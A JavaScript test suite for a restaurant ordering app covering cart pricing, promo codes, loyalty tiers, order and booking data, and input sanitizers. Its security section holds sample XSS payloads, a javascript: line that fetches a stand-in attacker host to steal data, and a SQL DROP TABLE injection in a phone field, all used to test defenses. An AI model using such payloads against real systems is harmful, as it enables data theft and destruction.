import test from 'node:test';
import assert from 'node:assert/strict';

// Import sanitizers (testing security defenses)
function sanitizeText(input, maxLength = 300) {
  if (!input || typeof input !== 'string') return '';
  let cleaned = input.trim();
  if (cleaned.length > maxLength) cleaned = cleaned.slice(0, maxLength);
  cleaned = cleaned.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '');
  cleaned = cleaned.replace(/<iframe\b[^<]*(?:(?!<\/iframe>)<[^<]*)*<\/iframe>/gi, '');
  cleaned = cleaned.replace(/<object\b[^<]*(?:(?!<\/object>)<[^<]*)*<\/object>/gi, '');
  cleaned = cleaned.replace(/<embed\b[^<]*(?:(?!<\/embed>)<[^<]*)*<\/embed>/gi, '');
  cleaned = cleaned.replace(/\bon\w+\s*=\s*(['"]).*?\1/gi, '');
  cleaned = cleaned.replace(/\bon\w+\s*=\s*[^>\s]+/gi, '');
  cleaned = cleaned.replace(/javascript:/gi, 'blocked:');
  cleaned = cleaned.replace(/data:text\/html/gi, 'blocked:');
  cleaned = cleaned.replace(/<[^>]*>?/gm, '');
  return cleaned.trim();
}

function sanitizePhoneNumber(phone) {
  if (!phone || typeof phone !== 'string') return '';
  return phone.replace(/[^\d+]/g, '').trim().slice(0, 16);
}

function sanitizePromoCode(code) {
  if (!code || typeof code !== 'string') return '';
  return code.replace(/[^a-zA-Z0-9]/g, '').toUpperCase().slice(0, 16);
}

function applyPromoCode(code, subtotal) {
  const cleanCode = sanitizePromoCode(code);
  if (cleanCode === 'MASUNGFB50' || cleanCode === 'MASUNGIG50' || cleanCode === 'FEEDBACK50') {
    return { success: true, discountAmount: 50, code: cleanCode };
  }
  if (cleanCode === 'MASUNG10') {
    return { success: true, discountAmount: Math.round(subtotal * 0.1), code: cleanCode };
  }
  return { success: false, discountAmount: 0, error: 'Invalid or expired promo code.' };
}

// Loyalty Tier Logic
function calculateTier(points) {
  if (points >= 300) return 'Legend';
  if (points >= 100) return 'Pitmaster';
  return 'Apprentice';
}

function calculatePointsEarned(totalSpent) {
  return Math.floor(Math.max(0, totalSpent) / 10);
}

// -------------------------------------------------------------
// TEST SUITE: QA & Verification
// -------------------------------------------------------------

test('1. Pricing and Cart Calculation Engine', async (t) => {
  await t.test('calculates single item without variant correctly', () => {
    const itemPrice = 99; // Pulled Pork Rice Bowl
    const quantity = 3;
    const subtotal = itemPrice * quantity;
    assert.equal(subtotal, 297);
  });

  await t.test('calculates item with variant price override', () => {
    const basePrice = 199;
    const variantPrice = 449; // Barkada 250g
    const quantity = 2;
    const effectivePrice = variantPrice !== undefined ? variantPrice : basePrice;
    const lineTotal = effectivePrice * quantity;
    assert.equal(lineTotal, 898);
  });

  await t.test('calculates subtotal across multi-item cart', () => {
    const cart = [
      { price: 199, quantity: 2 }, // Brisket: 398
      { price: 149, quantity: 1 }, // Pork Belly: 149
      { price: 99, quantity: 1 }   // Pulled Pork: 99
    ];
    const subtotal = cart.reduce((acc, item) => acc + (item.price * item.quantity), 0);
    assert.equal(subtotal, 646);
  });
});

test('2. Social Vouchers & Promo Engine QA', async (t) => {
  const subtotal = 500;

  await t.test('validates Facebook follower discount (MASUNGFB50)', () => {
    const res = applyPromoCode('masungfb50', subtotal);
    assert.equal(res.success, true);
    assert.equal(res.discountAmount, 50);
  });

  await t.test('validates Instagram follower discount (MASUNGIG50)', () => {
    const res = applyPromoCode('MASUNGIG50', subtotal);
    assert.equal(res.success, true);
    assert.equal(res.discountAmount, 50);
  });

  await t.test('validates percentage discount (MASUNG10)', () => {
    const res = applyPromoCode('MASUNG10', subtotal);
    assert.equal(res.success, true);
    assert.equal(res.discountAmount, 50); // 10% of 500
  });

  await t.test('validates guest feedback reward discount (FEEDBACK50)', () => {
    const res = applyPromoCode('feedback50', subtotal);
    assert.equal(res.success, true);
    assert.equal(res.discountAmount, 50);
  });

  await t.test('rejects fake or malformed promo codes', () => {
    const res = applyPromoCode('HACKER100', subtotal);
    assert.equal(res.success, false);
    assert.equal(res.discountAmount, 0);
  });

  await t.test('ensures final total does not drop below 0', () => {
    const smallSubtotal = 40;
    const discount = 50;
    const finalTotal = Math.max(0, smallSubtotal - discount);
    assert.equal(finalTotal, 0);
  });
});

test('3. Loyalty System Math & Tier Progression', async (t) => {
  await t.test('awards 1 BBQ point for every ₱10 spent', () => {
    assert.equal(calculatePointsEarned(99), 9);
    assert.equal(calculatePointsEarned(250), 25);
    assert.equal(calculatePointsEarned(1249), 124);
  });

  await t.test('computes correct loyalty tier thresholds', () => {
    assert.equal(calculateTier(0), 'Apprentice');
    assert.equal(calculateTier(99), 'Apprentice');
    assert.equal(calculateTier(100), 'Pitmaster');
    assert.equal(calculateTier(299), 'Pitmaster');
    assert.equal(calculateTier(300), 'Legend');
    assert.equal(calculateTier(1000), 'Legend');
  });

  await t.test('awards 25 welcome points on new profile signup', () => {
    const initialPoints = 0;
    const welcomeBonus = 25;
    const profile = { name: 'Juan Cruz', points: initialPoints + welcomeBonus };
    assert.equal(profile.points, 25);
  });
});

test('4. Security & Input Sanitization Defenses (OWASP)', async (t) => {
  await t.test('neutralizes script tags and XSS payloads', () => {
    const attack1 = '<script>alert("hacked")</script>Juan Diner';
    const cleaned = sanitizeText(attack1);
    assert.equal(cleaned, 'Juan Diner');
  });

  await t.test('strips event handlers (onerror, onload, onclick)', () => {
    const attack2 = '<img src=x onerror=alert(1)>Table 4 Special';
    const cleaned = sanitizeText(attack2);
    assert.equal(cleaned, 'Table 4 Special');
  });

  await t.test('neutralizes javascript: pseudoprotocol', () => {
    const attack3 = 'javascript:fetch("https://attacker.com?steal=")';
    const cleaned = sanitizeText(attack3);
    assert.ok(!cleaned.includes('javascript:'));
  });

  await t.test('cleans and normalizes phone numbers against injection', () => {
    const phoneInput = "0917-123-4567'; DROP TABLE masung_orders; --";
    const cleaned = sanitizePhoneNumber(phoneInput);
    assert.equal(cleaned, '09171234567');
  });

  await t.test('cleans promo code input', () => {
    const attackCode = "fb50<script>alert(1)</script>";
    const cleaned = sanitizePromoCode(attackCode);
    assert.equal(cleaned, 'FB50SCRIPTALERT1');
  });
});

test('5. Supabase Order Payload Contract Validation', async (t) => {
  const mockOrder = {
    id: 'MSO-1724890000000-842',
    tableNumber: 'Table 2 (Front Pit View)',
    orderType: 'dine-in',
    customerName: 'Maria Santos',
    customerPhone: '09171234567',
    items: [
      { id: 'item-brisket-solo', quantity: 2, price: 199 }
    ],
    subtotal: 398,
    discountAmount: 50,
    finalTotal: 348,
    pointsEarned: 34,
    status: 'smoking',
    createdAt: new Date().toISOString()
  };

  assert.ok(mockOrder.id.startsWith('MSO-'));
  assert.equal(typeof mockOrder.tableNumber, 'string');
  assert.ok(['dine-in', 'takeout'].includes(mockOrder.orderType));
  assert.equal(mockOrder.finalTotal, mockOrder.subtotal - mockOrder.discountAmount);
  assert.equal(mockOrder.pointsEarned, Math.floor(mockOrder.finalTotal / 10));
});

test('6. Reserve Suite Routing & Booking Contract Validation', async (t) => {
  const validPages = [
    'home', 'menu', 'order', 'loyalty', 'about', 'contact',
    'reserve', 'reserve-menu', 'reserve-shop', 'reserve-about', 'reserve-book', 'reserve-vip'
  ];

  await t.test('verifies all dedicated Reserve pages are valid PageId tokens', () => {
    const reservePages = validPages.filter(p => p.startsWith('reserve'));
    assert.equal(reservePages.length, 6);
    assert.ok(reservePages.includes('reserve'));
    assert.ok(reservePages.includes('reserve-menu'));
    assert.ok(reservePages.includes('reserve-shop'));
    assert.ok(reservePages.includes('reserve-about'));
    assert.ok(reservePages.includes('reserve-book'));
    assert.ok(reservePages.includes('reserve-vip'));
  });

  await t.test('validates event and venue reservation reference generation and contract', () => {
    const randomId = `MS-EVT-${Math.floor(100000 + 0.5 * 900000)}`;
    const mockBooking = {
      id: randomId,
      guestName: sanitizeText('Event Organizer Marco'),
      guestPhone: sanitizePhoneNumber('0968-237-0329'),
      date: '2026-09-05',
      timeSlot: '05:00 PM (Early Dinner Feast)',
      partySize: 20,
      seatingZone: 'upper_mezzanine',
      specialRequests: sanitizeText('Milestone celebration; request pre-sliced brisket platters and barista espresso packages.'),
      status: 'confirmed',
      createdAt: new Date().toISOString()
    };

    assert.ok(mockBooking.id.startsWith('MS-EVT-'));
    assert.equal(mockBooking.guestPhone, '09682370329');
    assert.ok(['full_loft_buyout', 'upper_mezzanine', 'ground_cafe', 'celebration_package'].includes(mockBooking.seatingZone));
    assert.ok(mockBooking.partySize >= 6 && mockBooking.partySize <= 50);
  });
});
